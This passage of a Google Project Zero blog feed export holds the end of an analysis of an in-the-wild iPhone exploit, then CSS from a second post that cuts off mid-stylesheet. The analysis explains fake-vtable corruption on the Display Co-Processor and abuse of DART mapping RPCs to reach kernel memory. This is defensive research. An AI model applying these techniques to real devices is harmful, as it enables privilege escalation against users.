class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;v25&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The destination object seems to be allocated very early and the DCP RTKit environment appears to be very deterministic with no ASLR. Almost certainly they are attempting to corrupt a neighbouring C++ object with a fake vtable pointer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Unfortunately for our analysis the trail goes cold here and we can't fully recreate the rest of the exploit. The bytes for the fake DCP C++ object are read from a file in the app's temporary directory (&lt;/span&gt;&lt;span&gt;base64 encoded inside a JSON file under the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;exploit_struct_offsets&lt;/span&gt;&lt;span&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;) and I don't have a copy of that file. But based on the flow of the rest of the exploit it's pretty clear what happens next:&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.wtkqcqujjnsf\"&gt;&lt;span&gt;sudo make me &lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;&amp;nbsp;DART mapping&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The DCP, like other coprocessors on iPhone, sits behind a DART (Device Address Resolution Table.) This is like an SMMU (IOMMU in the x86 world) which forces an extra layer of physical address lookup between the DCP and physical memory. &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://googleprojectzero.blogspot.com/2017/10/over-air-vol-2-pt-3-exploiting-wi-fi.html\"&gt;DART was covered in great detail in Gal Beniamini's Over The Air - Vol. 2, Pt. 3 blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The DCP clearly needs to access lots of buffers owned by userspace tasks as well as memory managed by the kernel. To do this the DCP makes RPC calls back to the AP which modifies the DART entries accordingly. This appears to be exactly what the DCP exploit does: the D45X family of DCP-&amp;gt;AP RPC methods appear to expose an interface for requesting arbitrary physical as well as virtual addresses to be mapped into the DCP DART.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The fake C++ object is most likely a stub which makes such calls on behalf of the exploit, allowing the exploit to read and write kernel memory.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.gkcey04fmfci\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Segmentation and isolation are in general a positive thing when it comes to security. However, splitting up an existing system into separate, intercommunicating parts can end up exposing unexpected code in unexpected ways.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;We've had discussions within Project Zero about whether this DCP vulnerability is interesting at all. After all, if the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UniformityCompensator&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;code was going to be running on the Application Processors anyway then the Display Co-Processor didn't really introduce or cause this bug.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Whilst that's true, it's also the case that the DCP certainly made exploitation of this bug significantly easier and more reliable than it would have been on the AP. Apple has invested heavily in memory corruption mitigations over the last few years, so moving an attack surface from a \"mitigation heavy\" environment to a \"mitigation light\" one is a regression in that sense.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;Another perspective is that the DCP just isn't isolated enough; perhaps the intention was to try to isolate the code on the DCP such that even if it's compromised it's limited in the effect it could have on the entire system. For example, there might be models where the DCP to AP RPC interface is much more restricted.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;But again there's a tradeoff: the more restrictive the RPC API, the more the DCP code has to be refactored - a significant investment. Currently, the codebase relies on being able to map arbitrary memory and the API involves passing userspace pointers back and forth.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;I've discussed in recent posts how attackers tend to be ahead of the curve. As the curve slowly shifts towards memory corruption exploitation getting more expensive, attackers are likely shifting too. We saw that in the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c17\"&gt;&lt;a class=\"HovzfPYjjR-c191\" href=\"https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html\"&gt;logic-bug sandbox escape used by NSO&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;and we see that here in this memory-corruption-based privilege escalation that side-stepped kernel mitigations by corrupting memory on a co-processor instead. Both are quite likely to continue working in some form in a post-memory tagging world. Both reveal the stunning depth of attack surface available to the motivated attacker. And both show that defensive security research still has a lot of work to do.&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/5973748726134682294/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5973748726134682294"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5973748726134682294"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html","@title":"The curious tale of a fake Carrier.app"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioBjlvs-GjJW9ZocxERk7cU6J-bBcWIjauCAzuI6QoMvdQENbSjF6elAZ0yUpLbHfTmOzfdKWBhB_FFR8X9UF1yMqN9XSMmJSUDZ_uVX_zctpmYMaD0G6V7bi68tdJ2C-e3eyM715_cTywzOWAgSbPyazbNtMv65p0lWewhacxCox_vrztKXdRZdjB/s72-c/Screenshot%202022-06-22%20at%2016.52.33.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-2485989426162409270","published":"2022-06-14T09:00:00.000-07:00","updated":"2022-06-14T09:00:24.588-07:00","title":{"@type":"text","#text":"An Autopsy on a Zombie In-the-Wild 0-day"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_vnkr79j0brd5-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_vnkr79j0brd5-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_rpn0sahs9m0k-5.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-5 0}.lst-kix_rpn0sahs9m0k-1&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-1}.lst-kix_vnkr79j0brd5-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_vnkr79j0brd5-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_vnkr79j0brd5-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_rpn0sahs9m0k-8.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-8 0}.lst-kix_vnkr79j0brd5-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_vnkr79j0brd5-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_vnkr79j0brd5-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_omx22nj2js1z-1.start{counter-reset:lst-ctn-kix_omx22nj2js1z-1 0}.lst-kix_omx22nj2js1z-0&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-0}ul.lst-kix_vnkr79j0brd5-4{list-style-type:none}ul.lst-kix_vnkr79j0brd5-3{list-style-type:none}ul.lst-kix_vnkr79j0brd5-2{list-style-type:none}ul.lst-kix_vnkr79j0brd5-1{list-style-type:none}.lst-kix_omx22nj2js1z-1&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-1,lower-latin) \". \"}ul.lst-kix_vnkr79j0brd5-8{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-0.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-0 0}ul.lst-kix_vnkr79j0brd5-7{list-style-type:none}.lst-kix_omx22nj2js1z-0&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-0,decimal) \". \"}ul.lst-kix_vnkr79j0brd5-6{list-style-type:none}ul.lst-kix_vnkr79j0brd5-5{list-style-type:none}ul.lst-kix_vnkr79j0brd5-0{list-style-type:none}.lst-kix_vnkr79j0brd5-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_omx22nj2js1z-2&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-2}.lst-kix_omx22nj2js1z-8&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-8}.lst-kix_3vloefecb731-0&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_omx22nj2js1z-0.start{counter-reset:lst-ctn-kix_omx22nj2js1z-0 0}ul.lst-kix_ziaggw1wsf95-3{list-style-type:none}ul.lst-kix_ziaggw1wsf95-4{list-style-type:none}ol.lst-kix_omx22nj2js1z-7.start{counter-reset:lst-ctn-kix_omx22nj2js1z-7 0}ul.lst-kix_ziaggw1wsf95-5{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-3.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-3 0}ul.lst-kix_ziaggw1wsf95-6{list-style-type:none}ul.lst-kix_ziaggw1wsf95-0{list-style-type:none}ul.lst-kix_ziaggw1wsf95-1{list-style-type:none}ul.lst-kix_ziaggw1wsf95-2{list-style-type:none}ul.lst-kix_3vloefecb731-0{list-style-type:none}.lst-kix_3vloefecb731-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_3vloefecb731-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_3vloefecb731-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_3vloefecb731-8{list-style-type:none}ul.lst-kix_3vloefecb731-7{list-style-type:none}ul.lst-kix_3vloefecb731-6{list-style-type:none}ul.lst-kix_3vloefecb731-5{list-style-type:none}.lst-kix_3vloefecb731-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_3vloefecb731-4{list-style-type:none}ul.lst-kix_3vloefecb731-3{list-style-type:none}.lst-kix_3vloefecb731-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_3vloefecb731-2{list-style-type:none}ul.lst-kix_3vloefecb731-1{list-style-type:none}.lst-kix_rpn0sahs9m0k-8&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-8}ol.lst-kix_omx22nj2js1z-6.start{counter-reset:lst-ctn-kix_omx22nj2js1z-6 0}.lst-kix_rpn0sahs9m0k-2&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-2}.lst-kix_rpn0sahs9m0k-5&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-5}.lst-kix_3vloefecb731-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_3vloefecb731-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_3vloefecb731-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_rpn0sahs9m0k-2.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-2 0}.lst-kix_omx22nj2js1z-5&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-5}ol.lst-kix_rpn0sahs9m0k-1.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-1 0}.lst-kix_omx22nj2js1z-4&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-4}.lst-kix_rpn0sahs9m0k-6&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-6}ol.lst-kix_rpn0sahs9m0k-4.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-4 0}ol.lst-kix_omx22nj2js1z-8.start{counter-reset:lst-ctn-kix_omx22nj2js1z-8 0}ol.lst-kix_omx22nj2js1z-2.start{counter-reset:lst-ctn-kix_omx22nj2js1z-2 0}ul.lst-kix_ziaggw1wsf95-7{list-style-type:none}ul.lst-kix_ziaggw1wsf95-8{list-style-type:none}.lst-kix_omx22nj2js1z-3&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-3}ol.lst-kix_rpn0sahs9m0k-7.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-7 0}.lst-kix_omx22nj2js1z-6&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-6}.lst-kix_rpn0sahs9m0k-4&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-4}.lst-kix_rpn0sahs9m0k-7&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-7}ol.lst-kix_omx22nj2js1z-5.start{counter-reset:lst-ctn-kix_omx22nj2js1z-5 0}.lst-kix_rpn0sahs9m0k-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_rpn0sahs9m0k-5,lower-roman) \") \"}.lst-kix_rpn0sahs9m0k-6&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-6,decimal) \". \"}.lst-kix_rpn0sahs9m0k-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_rpn0sahs9m0k-4,lower-latin) \") \"}.lst-kix_rpn0sahs9m0k-8&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-8,lower-roman) \". \"}.lst-kix_rpn0sahs9m0k-1&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-1,lower-latin) \") \"}.lst-kix_rpn0sahs9m0k-2&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-2,lower-roman) \") \"}.lst-kix_rpn0sahs9m0k-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_rpn0sahs9m0k-3,decimal) \") \"}.lst-kix_omx22nj2js1z-2&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-2,lower-roman) \". \"}.lst-kix_rpn0sahs9m0k-3&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-3}.lst-kix_omx22nj2js1z-3&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-3,decimal) \". \"}ol.lst-kix_omx22nj2js1z-3.start{counter-reset:lst-ctn-kix_omx22nj2js1z-3 0}ol.lst-kix_rpn0sahs9m0k-7{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-8{list-style-type:none}.lst-kix_omx22nj2js1z-5&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-5,lower-roman) \". \"}.lst-kix_ziaggw1wsf95-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_rpn0sahs9m0k-0&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-0,decimal) \") \"}.lst-kix_omx22nj2js1z-4&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-4,lower-latin) \". \"}.lst-kix_omx22nj2js1z-7&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-7}.lst-kix_omx22nj2js1z-7&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-7,lower-latin) \". \"}ol.lst-kix_rpn0sahs9m0k-1{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-2{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-0{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-5{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-6{list-style-type:none}.lst-kix_omx22nj2js1z-6&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-6,decimal) \". \"}ol.lst-kix_rpn0sahs9m0k-3{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-6.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-6 0}.lst-kix_omx22nj2js1z-1&gt;li{counter-increment:lst-ctn-kix_omx22nj2js1z-1}ol.lst-kix_rpn0sahs9m0k-4{list-style-type:none}.lst-kix_ziaggw1wsf95-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_omx22nj2js1z-0{list-style-type:none}.lst-kix_ziaggw1wsf95-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_ziaggw1wsf95-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ziaggw1wsf95-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ziaggw1wsf95-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_omx22nj2js1z-8&gt;li:before{content:\"\" counter(lst-ctn-kix_omx22nj2js1z-8,lower-roman) \". \"}ol.lst-kix_omx22nj2js1z-6{list-style-type:none}.lst-kix_ziaggw1wsf95-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_omx22nj2js1z-5{list-style-type:none}ol.lst-kix_omx22nj2js1z-4.start{counter-reset:lst-ctn-kix_omx22nj2js1z-4 0}ol.lst-kix_omx22nj2js1z-8{list-style-type:none}.lst-kix_ziaggw1wsf95-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ziaggw1wsf95-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_omx22nj2js1z-7{list-style-type:none}ol.lst-kix_omx22nj2js1z-2{list-style-type:none}ol.lst-kix_omx22nj2js1z-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_omx22nj2js1z-4{list-style-type:none}ol.lst-kix_omx22nj2js1z-3{list-style-type:none}.lst-kix_rpn0sahs9m0k-0&gt;li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-0}.lst-kix_rpn0sahs9m0k-7&gt;li:before{content:\"\" counter(lst-ctn-kix_rpn0sahs9m0k-7,lower-latin) \". \"}ol{margin:0;padding:0}table td,table th{padding:0}.ZslSztaQWN-c45{border-right-style:solid;padding-top:1.7pt;border-top-width:0pt;border-right-width:0pt;padding-left:8.5pt;padding-bottom:4.2pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;text-align:left;padding-right:0pt}.ZslSztaQWN-c9{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#00aa00;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c49{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#00aa00;border-top-width:0pt;border-right-width:1pt;border-left-color:#00aa00;vertical-align:top;border-right-color:#00aa00;border-left-width:1pt;border-top-style:solid;background-color:#ddffdd;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#cc0000;border-bottom-style:solid}.ZslSztaQWN-c38{border-right-style:solid;padding:0pt 2pt 0pt 2pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#eeeeee;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c30{border-right-style:solid;padding:0pt 2pt 0pt 2pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#999999;vertical-align:top;border-right-color:#d7d7d7;border-left-width:0pt;border-top-style:solid;background-color:#eeeeee;border-left-style:solid;border-bottom-width:1pt;width:27pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c44{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#cc0000;border-top-width:0pt;border-right-width:0pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#000000;border-bottom-style:solid}.ZslSztaQWN-c36{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#cc0000;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c51{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:0pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;width:421.5pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c13{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#888866;vertical-align:top;border-right-color:#d7d7d7;border-left-width:0pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:27pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c48{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.ZslSztaQWN-c50{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#d7d7d7;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#f7f7f7;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c34{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#cc0000;border-top-width:1pt;border-right-width:1pt;border-left-color:#cc0000;vertical-align:top;border-right-color:#cc0000;border-left-width:1pt;border-top-style:solid;background-color:#ffdddd;border-left-style:solid;border-bottom-width:0pt;width:421.5pt;border-top-color:#cc0000;border-bottom-style:solid}.ZslSztaQWN-c18{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center;height:11pt}.ZslSztaQWN-c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.ZslSztaQWN-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.ZslSztaQWN-c31{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.ZslSztaQWN-c52{padding-top:6pt;padding-bottom:0pt;line-height:1.45;text-align:left}.ZslSztaQWN-c46{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.ZslSztaQWN-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.ZslSztaQWN-c8{color:#000000;font-weight:400;font-size:20pt;font-family:\"Arial\"}.ZslSztaQWN-c25{color:#24292f;font-weight:400;font-size:10pt;font-family:Consolas,\"Courier New\"}.ZslSztaQWN-c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ZslSztaQWN-c17{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.ZslSztaQWN-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.ZslSztaQWN-c32{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.ZslSztaQWN-c21{color:#000000;font-weight:400;font-size:7pt;font-family:\"Verdana\"}.ZslSztaQWN-c1{font-size:10pt;font-family:Consolas,\"Courier New\";color:#3367d6;font-weight:400}.ZslSztaQWN-c33{font-size:7pt;font-family:\"Verdana\";color:#888866;font-weight:400}.ZslSztaQWN-c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ZslSztaQWN-c3{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.ZslSztaQWN-c27{border-spacing:0;border-collapse:collapse;margin-right:auto}.ZslSztaQWN-c42{color:#333333;font-weight:700;font-size:11pt;font-family:\"Arial\"}.ZslSztaQWN-c2{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.ZslSztaQWN-c28{font-size:7pt;font-family:\"Courier New\";font-weight:400}.ZslSztaQWN-c43{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.ZslSztaQWN-c4{font-family:Consolas,\"Courier New\";color:#0d904f;font-weight:400}.ZslSztaQWN-c6{text-decoration:none;vertical-align:baseline;font-style:normal}.ZslSztaQWN-c19{orphans:2;widows:2}.ZslSztaQWN-c29{color:#1155cc;font-weight:700}.ZslSztaQWN-c23{margin-left:36pt;padding-left:0pt}.ZslSztaQWN-c47{font-weight:400;font-family:Consolas,\"Courier 